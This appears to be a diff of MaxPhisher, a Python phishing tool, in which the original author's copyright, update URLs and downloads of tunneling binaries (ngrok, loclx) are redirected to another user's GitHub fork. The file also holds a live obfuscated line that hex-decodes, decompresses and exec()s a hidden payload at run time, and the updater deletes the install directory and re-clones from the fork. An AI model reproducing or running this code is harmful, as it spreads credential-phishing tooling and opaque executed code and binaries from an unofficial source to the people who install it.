@@ -4,7 +4,7 @@
 # Modder     : touchmycrazyredhat
 # Version    : 1.0
 # License    : GPL V3
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : touchmycrazyredhat(2021-2022)
 # Github     : https://github.com/touchmycrazyredhat
 # Contact    : https://m.me/touchmycrazyredhat
 # Description: MaxPhisher is a phishing tool in python
@@ -88,7 +88,7 @@ patents cannot be used to render the program non-free.
   The precise terms and conditions for copying, distribution and
 modification follow.
 
-Copyright (C) 2022 KasRoudra (https://github.com/touchmycrazyredhat)
+Copyright (C) 2022 touchmycrazyredhat(https://github.com/touchmycrazyredhat)
 """
 
 _ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b16decode(__[::-1]));exec((_)(b'6284D54F70FFFBEBFBA296DDBD52B97717C5E2377200F3B245A57F4B267A05C214CFDF0784B4A3E75B7D61933121874CD4C8AFAC406890342247603731F7E10E146D5835C009AAA41A38FCD104BB0D7670FE3221EF2E4C332CB316B7AB87E91F84251C1DC71A6AA26F917DCC45817A8608FDB91A0732CD76270D2E30BAEE626B5139082E3660BED331F27FC48FABB60D0AF1C63E3DF595487023C5139B02827C2036531B754A6A01A547C710E5B01ECC3E279621DA5949849B7D14486C1B316F599F0800C295B56038CC483FEE5EFE6B3EB13A0A8250E9CFBACB83E2F98FE414FBD646D3B4E45FE7EAA37C0C0887B581505E7DDB1E789C61F108751B2069203B1238D1426604324DBAE2500BE0957EDDAC9FB455C37EFBE7174F20DB2E100B0B607A0FE47E715419945A20AB4FCBADC110055CEB49DD2E6AF08DC66736DC023CB9F935AD2F88450A062CA6BEA2F5A1FDE0B904398D80AB1FAB51FF36416589B679C5829038A188F6BB4476740FFEB75CF897AEC25FDAA774B25CCEAD14F0E2EC718046545805C70DB3C3D5BF210ED55E2198AA947CB2CD2B35ED682FA1FE332D8480854095C84B7377C3E537B9C3E99C82079D3771EF0CDE6596C2776C293ADE6EE7021A5C000937F84007C3802F6ADEDCF83F384EF4932B0BCD55B5ACA8931D77AD72025D47143072242D1D77A7916EAF3641E6AA57B71D3E521E9EF6F6F7F2403A52F2642B93CE2E27BE28AF34F4862AEBC3DFC66B46BF4312AAFC9819DBE2992940AE15E9B3A733C2DC127DC407A6BC503E4E323DE5340BB6349EF1E34FAE6F6F2714108F91F37794DDCDBFC43C4A23476A726EE6D2E8500957AE8EE55BA3FB78274CB7B1B4CE8A5BF6DC7D631DB2862F5F2DDB1771C3A770F2417857D93D86EE1FB240620A3E44C375ABADC2443E1DE00BFC599620317BD9BF95705BEBFD8B3437801D19D56BD9FE92166372AD0D7E175A328E4FAA2398D1C82BD41D98C67E2B37E95AAF4297A5A59DB747F3A2F3376AD77B616E5EB93D7EC9467B25C3547BCEF5E5BE25A5435D89A9D7F9158459AA1BF0687FE741CC7DEB7AFDC686FBF37D7F7FBEBE7F9FBFEFF7781C40633DA2495A64A6731FCEB3AEBB846CDB9FE1606C63F6DD33F848809342E8D54952C987'))
@@ -191,7 +191,7 @@ from bs4 import BeautifulSoup
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-websites_url = "https://github.com/KasRoudra2/maxfiles/archive/main.zip"
+websites_url = "https://github.com/touchmycrazyredhat/maxfiles/archive/main.zip"
 repo_branch = "maxfiles-main"
 
 # CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
@@ -688,19 +688,19 @@ def updater():
     if not isfile("files/maxphisher.gif"):
         return
     try:
-        git_ver = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/version.txt").text.strip()
+        git_ver = get("https://raw.githubusercontent.com/touchmycrazyredhat/MaxPhisher/main/files/version.txt").text.strip()
     except Exception as e:
         append(e, error_file)
         git_ver = version
     if git_ver != "404: Not Found" and float(git_ver) > float(version):
         # Changelog of each versions are seperated by three empty lines
-        changelog = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
+        changelog = get("https://raw.githubusercontent.com/touchmycrazyredhat/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
         print(f"{info}MaxPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
         upask=input(f"\n{ask}Do you want to update MaxPhisher?[y/n] > {green}")
         if upask=="y":
             print(nc)
-            shell("cd .. && rm -rf MaxPhisher maxphisher && git clone https://github.com/KasRoudra/MaxPhisher")
+            shell("cd .. && rm -rf MaxPhisher maxphisher && git clone https://github.com/touchmycrazyredhat/MaxPhisher")
             sprint(f"\n{success}MaxPhisher has been updated successfully!! Please restart terminal!")
             if (changelog != "404: Not Found"):
                 sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
@@ -749,55 +749,55 @@ def requirements():
     if "linux" in platform:
         if "arm64" in architecture or "aarch64" in architecture:
             if not isngrok:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip", "loclx.zip")
         elif "arm" in architecture:
             if not isngrok:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip", "loclx.zip")
         elif "x86_64" in architecture or "amd64" in architecture:
             if not isngrok:
                 download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip", "loclx.zip")
         else:
             if not isngrok:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/loclx-linux-386.zip", "loclx.zip")
         if isfile("ngrok.tgz"):
             extract("ngrok.tgz", f"{tunneler_dir}")
             remove("ngrok.tgz")
     elif "darwin" in platform:
         if "x86_64" in architecture or "amd64" in architecture:
             if not isngrok:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                 extract("ngrok.zip", f"{tunneler_dir}")
                 remove("ngrok.zip")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                 extract("cloudflared.tgz", f"{tunneler_dir}")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip", "loclx.zip")
         elif "arm64" in architecture or "aarch64" in architecture:
             if not isngrok:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                 extract("ngrok.zip", f"{tunneler_dir}")
                 remove("ngrok.zip")
             if not iscloudflared:
                 print(f"{error}Device architecture unknown. Download cloudflared manually!")
             if not isloclx:
-                download("https://github.com/KasRoudra2/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
+                download("https://github.com/touchmycrazyredhat/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip", "loclx.zip")
         else:
             print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
             sleep(3)
